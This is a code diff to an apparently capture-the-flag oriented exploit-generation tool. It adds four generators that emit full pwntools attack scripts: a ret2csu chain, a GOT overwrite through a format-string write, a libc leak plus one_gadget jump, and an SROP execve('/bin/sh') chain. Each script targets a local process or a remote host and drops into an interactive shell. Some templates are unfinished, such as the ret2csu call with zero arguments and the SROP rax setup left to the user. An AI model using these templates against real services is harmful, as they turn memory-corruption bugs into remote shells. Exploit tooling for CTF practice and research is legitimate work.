@@ -13,16 +13,20 @@ import tempfile
 log = logging.getLogger("triage-web")
 
 SOLVER_LIST = [
-    {"id": "angr_find_flag", "name": "angr — Find Flag"},
-    {"id": "triton_solve_flag", "name": "Triton — Concolic Flag Solve"},
-    {"id": "unicorn_emulate_func", "name": "Unicorn — Emulate Function"},
-    {"id": "z3_constraint_solve", "name": "Z3 — Constraint Solve"},
-    {"id": "static_string_reconstruct", "name": "Static — String Reconstruct"},
-    {"id": "overflow_exploit", "name": "pwn — ret2win / BOF"},
-    {"id": "ret2libc", "name": "pwn — ret2libc"},
-    {"id": "rop_execve_chain", "name": "pwn — ROP execve"},
-    {"id": "shellcode_exploit", "name": "pwn — Shellcode Injection"},
-    {"id": "format_string_exploit", "name": "pwn — Format String"},
+    {"id": "angr_find_flag", "name": "Symbolic — Find Flag"},
+    {"id": "triton_solve_flag", "name": "Symbolic — Concolic Solve"},
+    {"id": "unicorn_emulate_func", "name": "Emulation — Function Emulation"},
+    {"id": "z3_constraint_solve", "name": "Symbolic — Constraint Solve"},
+    {"id": "static_string_reconstruct", "name": "Static — String Reconstruction"},
+    {"id": "overflow_exploit", "name": "Stack — ret2win / BOF"},
+    {"id": "ret2libc", "name": "Stack — ret2libc"},
+    {"id": "rop_execve_chain", "name": "Stack — ROP execve Chain"},
+    {"id": "shellcode_exploit", "name": "Stack — Shellcode Injection"},
+    {"id": "format_string_exploit", "name": "Stack — Format String Write"},
+    {"id": "ret2csu_chain", "name": "Stack — ret2csu Gadget Chain"},
+    {"id": "got_overwrite", "name": "Stack — GOT Overwrite"},
+    {"id": "one_gadget_rce", "name": "Stack — One-Gadget RCE"},
+    {"id": "srop_chain", "name": "Stack — SROP Chain"},
 ]
 
 SOLVER_TIMEOUT = 120  # seconds
@@ -432,6 +436,166 @@ def _unicorn_emulate_func(
     )
 
 
+def _ret2csu(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
+    """3-argument call via the __libc_csu_init gadget pair, for binaries whose
+    ROP gadget set has no clean `pop rdi; ret` - __libc_csu_init ships with
+    nearly every dynamically-linked glibc binary, so its gadgets are almost
+    always available even when the rest of the binary is gadget-poor."""
+    return (
+        f"{_common(path)}"
+        f"from pwn import *\n\n"
+        f"elf = context.binary = ELF(BINARY, checksec=False)\n"
+        f'context.log_level = "info"\n\n'
+        f"rop = ROP(elf)\n"
+        f"try:\n"
+        f'    POP_GADGET = rop.find_gadget(["pop rbx", "pop rbp", "pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0]\n'
+        f"except (IndexError, TypeError):\n"
+        f'    raise SystemExit("csu pop gadget not found - __libc_csu_init may be stripped/optimised out")\n'
+        f"CALL_GADGET = POP_GADGET + 0x1a  # `mov rdx,r13; mov rsi,r14; mov edi,r12d; call [r15+rbx*8]` follows the pop chain\n"
+        f'CALL_TARGET = elf.got["read"]  # a GOT entry already resolved to a real libc function - call [r15] reaches it\n'
+        f"{_offset_line(overflow_offset)}\n"
+        f"def conn():\n"
+        f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
+        f"def exploit():\n"
+        f"    io = conn()\n"
+        f'    payload  = b"A" * OFFSET\n'
+        f"    payload += p64(POP_GADGET)\n"
+        f"    payload += p64(0)              # rbx - call [r15 + rbx*8] must land on rbx=0\n"
+        f"    payload += p64(1)              # rbp - loop counter after the call; 1 skips the gadget's internal repeat\n"
+        f"    payload += p64(0)              # r12 -> edi (arg1, truncated to 32 bits by the gadget)\n"
+        f"    payload += p64(0)              # r13 -> rdx (arg3)\n"
+        f"    payload += p64(0)              # r14 -> rsi (arg2)\n"
+        f"    payload += p64(CALL_TARGET)    # r15 - dereferenced by call [r15+rbx*8]\n"
+        f"    payload += p64(CALL_GADGET)\n"
+        f"    payload += p64(0xdeadbeef) * 7  # call_gadget's own pop epilogue - filler, values unused\n"
+        f'    io.sendlineafter(b"> ", payload)\n'
+        f"    io.interactive()\n\n"
+        f"exploit()\n"
+    )
+
+
+def _got_overwrite(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
+    """Redirect a GOT entry with pwntools' automatic %n payload builder, for
+    binaries that expose a format-string write into an already-resolved
+    import - the everyday route to an arbitrary-write primitive."""
+    return (
+        f"{_common(path)}"
+        f"from pwn import *\n\n"
+        f"elf = context.binary = ELF(BINARY, checksec=False)\n"
+        f'context.log_level = "info"\n\n'
+        f'TARGET_FUNC = "atoi"  # a function the program still calls after our write - its GOT entry is the hijack point\n'
+        f'REDIRECT_TO = elf.symbols.get("win") or elf.symbols.get("system") or 0\n'
+        f'assert REDIRECT_TO, "no win()/system - point REDIRECT_TO at your own target"\n'
+        f"FMT_OFFSET  = 6  # index of the first attacker-controlled stack arg - find with %p.%p.%p.%p.%p.%p.%p.%p\n\n"
+        f"def conn():\n"
+        f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
+        f"def exploit():\n"
+        f"    io = conn()\n"
+        f"    got_entry = elf.got[TARGET_FUNC]\n"
+        f"    payload = fmtstr_payload(FMT_OFFSET, {{got_entry: REDIRECT_TO}})\n"
+        f'    io.sendlineafter(b"> ", payload)\n'
+        f"    io.interactive()\n\n"
+        f"exploit()\n"
+    )
+
+
+def _one_gadget_rce(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
+    """Leak libc, then jump straight at a one_gadget magic offset instead of
+    building a system("/bin/sh") chain - no argument setup needed, but each
+    offset has its own register/stack constraints, so try them in order."""
+    if pop_rdi is not None:
+        pop_rdi_block = f"POP_RDI = {hex(pop_rdi)}  # recovered by ROPEngine.scan()\n"
+    else:
+        pop_rdi_block = (
+            "rop = ROP(elf)\n"
+            "try:\n"
+            '    POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]\n'
+            "except (IndexError, TypeError):\n"
+            '    raise SystemExit("pop rdi; ret gadget not found - supply POP_RDI manually")\n'
+        )
+    return (
+        f"{_common(path)}"
+        f"from pwn import *\n\n"
+        f"elf = context.binary = ELF(BINARY, checksec=False)\n"
+        f'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)\n'
+        f'# libc = ELF("./libc.so.6", checksec=False)  # use if provided\n'
+        f'context.log_level = "info"\n\n'
+        f"{pop_rdi_block}"
+        f"{_offset_line(overflow_offset)}\n"
+        f"# offsets from `one_gadget libc.so.6` - try each in order, the first satisfying its constraints pops a shell\n"
+        f"ONE_GADGET_OFFSETS = [0x50a37, 0xebc81, 0xebc85, 0xebc88]\n\n"
+        f"def conn():\n"
+        f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
+        f"def stage1_leak(io):\n"
+        f'    payload  = b"A" * OFFSET\n'
+        f"    payload += p64(POP_RDI)\n"
+        f'    payload += p64(elf.got["puts"])\n'
+        f'    payload += p64(elf.plt["puts"])\n'
+        f'    payload += p64(elf.sym["main"])\n'
+        f'    io.sendlineafter(b"> ", payload)\n'
+        f'    leak = u64(io.recvline().strip().ljust(8, b"\\\\x00"))\n'
+        f'    libc.address = leak - libc.sym["puts"]\n'
+        f'    log.success(f"libc @ {{hex(libc.address)}}")\n\n'
+        f"def stage2_one_gadget(io):\n"
+        f'    payload  = b"A" * OFFSET\n'
+        f"    payload += p64(libc.address + ONE_GADGET_OFFSETS[0])\n"
+        f'    io.sendlineafter(b"> ", payload)\n\n'
+        f"def exploit():\n"
+        f"    io = conn()\n"
+        f"    stage1_leak(io)\n"
+        f"    stage2_one_gadget(io)\n"
+        f"    io.interactive()\n\n"
+        f"exploit()\n"
+    )
+
+
+def _srop_chain(
+    path: str, bits: int, arch: str, pop_rdi: int | None = None, overflow_offset: int | None = None
+) -> str:
+    """Sigreturn-oriented chain: one `syscall` gadget plus a forged sigcontext
+    controls every register (rax/rdi/rsi/rdx/rip/...), so it works even when
+    the binary has no gadgets beyond a bare `syscall; ret`."""
+    return (
+        f"{_common(path)}"
+        f"from pwn import *\n\n"
+        f"elf = context.binary = ELF(BINARY, checksec=False)\n"
+        f'context.arch  = "{arch.lower().replace("_64", "")}"\n'
+        f"context.bits  = {bits}\n"
+        f'context.log_level = "info"\n\n'
+        f"rop = ROP(elf)\n"
+        f"try:\n"
+        f'    SYSCALL = rop.find_gadget(["syscall", "ret"])[0]\n'
+        f"except (IndexError, TypeError):\n"
+        f'    raise SystemExit("syscall; ret gadget not found - supply SYSCALL manually")\n'
+        f"{_offset_line(overflow_offset)}\n"
+        f"def conn():\n"
+        f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
+        f"def exploit():\n"
+        f"    io = conn()\n"
+        f'    bin_sh = next(elf.search(b"/bin/sh\\\\x00"), None) or 0x0  # a writable "/bin/sh" - pivot to your own buffer if absent\n\n'
+        f'    frame = SigreturnFrame(arch=context.arch, kernel="amd64")\n'
+        f"    frame.rax = constants.SYS_execve\n"
+        f"    frame.rdi = bin_sh\n"
+        f"    frame.rsi = 0\n"
+        f"    frame.rdx = 0\n"
+        f"    frame.rip = SYSCALL\n\n"
+        f"    # the kernel requires rax == SYS_rt_sigreturn (15) at the moment `syscall` runs; either land here\n"
+        f"    # where eax is already 15 from a prior syscall wrapper, or chain a `pop rax; ret` gadget first\n"
+        f'    payload  = b"A" * OFFSET\n'
+        f"    payload += p64(SYSCALL)\n"
+        f"    payload += bytes(frame)\n"
+        f'    io.sendlineafter(b"> ", payload)\n'
+        f"    io.interactive()\n\n"
+        f"exploit()\n"
+    )
+
+
 # Map solver type → generator function
 SOLVER_GENERATORS = {
     "angr_find_flag": _angr_find,
@@ -444,6 +608,10 @@ SOLVER_GENERATORS = {
     "format_string_exploit": _format_string,
     "ret2libc": _ret2libc,
     "shellcode_exploit": _shellcode_exploit,
+    "ret2csu_chain": _ret2csu,
+    "got_overwrite": _got_overwrite,
+    "one_gadget_rce": _one_gadget_rce,
+    "srop_chain": _srop_chain,
 }
 
 
